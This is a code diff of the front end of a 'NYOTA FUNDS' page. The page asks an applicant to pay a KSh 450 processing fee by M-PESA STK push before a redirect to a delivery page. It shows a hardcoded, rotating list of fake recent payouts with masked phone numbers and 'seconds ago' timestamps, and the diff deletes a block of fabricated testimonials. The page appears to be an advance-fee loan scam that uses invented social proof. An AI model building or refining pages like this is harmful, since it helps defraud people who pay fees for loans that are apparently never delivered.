@@ -183,9 +183,10 @@ animation:flowerFall linear forwards;
 <div class="container">
 <div class="card">
 
-<h1>🌟🇰🇪🇰🇪NYOTA FUNDS</h1>
+<h1>🌟 NYOTA FUNDS</h1>
 
 <p>👋 Welcome, <strong id="name">Applicant</strong></p>
+
 <p>Please complete the processing fee payment to continue.</p>
 
 <div class="amount" id="selectedAmountBox">
@@ -235,14 +236,17 @@ animation:flowerFall linear forwards;
 </div>
 
 </div>
+
 </div>
 </div>
 
 <script>
 "use strict";
 
+/* YOUR LIVE RENDER BACKEND */
 const BACKEND_URL="https://nyota-program-001-functionality-1.onrender.com";
 
+/* Applicant details */
 const applicant=
 localStorage.getItem("fullName")||
 localStorage.getItem("fullname")||
@@ -257,10 +261,9 @@ localStorage.getItem("phone")||
 const processingFee=
 Number(localStorage.getItem("processingFee")||450);
 
+/* CORRECT: Read selected amount from page3.html only */
 const selectedAmount=
-Number(localStorage.getItem("selectedAmount")||
-localStorage.getItem("amount")||
-0);
+Number(localStorage.getItem("selectedAmount")||0);
 
 document.getElementById("name").textContent=applicant;
 document.getElementById("fullName").value=applicant;
@@ -289,7 +292,9 @@ payBtn.textContent=state?text:"💳 Pay Processing Fee";
 function normalizePhone(value){
 let phone=value.replace(/[^\d+]/g,"");
 if(phone.startsWith("+254")) phone=phone.slice(1);
-if(phone.startsWith("07")||phone.startsWith("01")) phone="254"+phone.slice(1);
+if(phone.startsWith("07")||phone.startsWith("01")){
+phone="254"+phone.slice(1);
+}
 return phone;
 }
 
@@ -297,6 +302,8 @@ async function readJson(res){
 const txt=await res.text();
 return txt?JSON.parse(txt):{};
 }
+
+/* STK PUSH */
 
 async function payNow(){
 
@@ -316,8 +323,13 @@ try{
 
 const response=await fetch(`${BACKEND_URL}/stk-push`,{
 method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify({phone,amount:processingFee})
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+phone,
+amount:processingFee
+})
 });
 
 const data=await readJson(response);
@@ -337,10 +349,15 @@ setMessage("STK Push sent. Enter your M-PESA PIN.");
 await checkPayment(transactionId);
 
 }catch(error){
+
 setMessage(error.message,"error");
 setLoading(false);
+
 }
+
 }
+
+/* PAYMENT STATUS */
 
 async function checkPayment(transactionId){
 
@@ -352,7 +369,9 @@ try{
 
 const response=await fetch(`${BACKEND_URL}/payment-status`,{
 method:"POST",
-headers:{"Content-Type":"application/json"},
+headers:{
+"Content-Type":"application/json"
+},
 body:JSON.stringify({transactionId})
 });
 
@@ -363,7 +382,11 @@ const status=String(result.data?.status||"").toUpperCase();
 if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
 setMessage("Payment successful. Redirecting...","success");
 setLoading(true,"Payment Confirmed");
-setTimeout(()=>window.location.href="delivery.html",1000);
+
+setTimeout(()=>{
+window.location.href="delivery.html";
+},1000);
+
 return;
 }
 
@@ -382,10 +405,12 @@ return;
 }
 
 await new Promise(r=>setTimeout(r,3000));
+
 }
 
 setMessage("Payment confirmation timed out.","error");
 setLoading(false);
+
 }
 
 payBtn.addEventListener("click",payNow);
@@ -396,13 +421,18 @@ const rainContainer=document.getElementById("flowerRain");
 const flowerIcons=["🌸","🌺","🌹","🌼","💐","🌷"];
 
 function createRainFlower(){
+
 const flower=document.createElement("span");
+
 flower.className="rain-flower";
 flower.textContent=flowerIcons[Math.floor(Math.random()*flowerIcons.length)];
+
 flower.style.left=Math.random()*100+"%";
 flower.style.fontSize=(16+Math.random()*12)+"px";
 flower.style.animationDuration=(2+Math.random()*2)+"s";
+
 rainContainer.appendChild(flower);
+
 setTimeout(()=>flower.remove(),4000);
 }
 
@@ -419,26 +449,6 @@ const livePeople=[
 ["Kiptoo","07*****28","KSh 75,000","12s ago"],
 ["Njeri","07*****71","KSh 110,000","9s ago"],
 ["Mutua","07*****84","KSh 40,000","15s ago"],
-["Victor Yegon","The application process was easy to follow.","just now"],
-["Irene Atieno","Quick approval experience.","30 seconds ago"],
-["Winfred Chepkemoi","Happy with the application process.","5 minutes ago"],
-["Victor Ochieng","The platform was easy to use.","10 seconds ago"],
-["Ruth Chelimo","Application completed successfully.","30 seconds ago"],
-["Faith Njeri","The payment process was smooth.","1 minute ago"],
-["Felix Kariuki","Amazing service.","10 seconds ago"],
-["Brenda Akinyi","Happy with the experience.","2 seconds ago"],
-["Peter Mutiso","The platform was straightforward.","just now"],
-["Susan Wairimu","Easy application experience.","just now"],
-["Paul Onyango","Everything worked smoothly.","30 seconds ago"],
-["Lucy Atieno","The process was clear.","just now"],
-["Mary Wanjiku","Easy application experience.","30 seconds ago"],
-["Diana Jepkosgei","Fast application process.","5 minutes ago"],
-["Patrick Kimani","Simple and clear process.","2 minutes ago"],
-["Stephen Bett","Everything worked smoothly.","10 seconds ago"],
-["Allan Otieno","Very quick process.","1 minute ago"],
-["Caroline Mumbi","Quick processing.","10 seconds ago"],
-["Daniel Ouma","Fast and reliable experience.","just now"],
-["Grace Akinyi","Very satisfied with the application experience.","10 seconds ago"],
 ["Atieno","07*****53","KSh 65,000","7s ago"],
 ["Mwangi","07*****16","KSh 85,000","11s ago"],
 ["Chebet","07*****62","KSh 35,000","6s ago"],
@@ -451,6 +461,7 @@ const livePeople=[
 let current=4;
 
 function updateLiveComments(){
+
 const p1=livePeople[current];
 const p2=livePeople[(current+1)%livePeople.length];
 
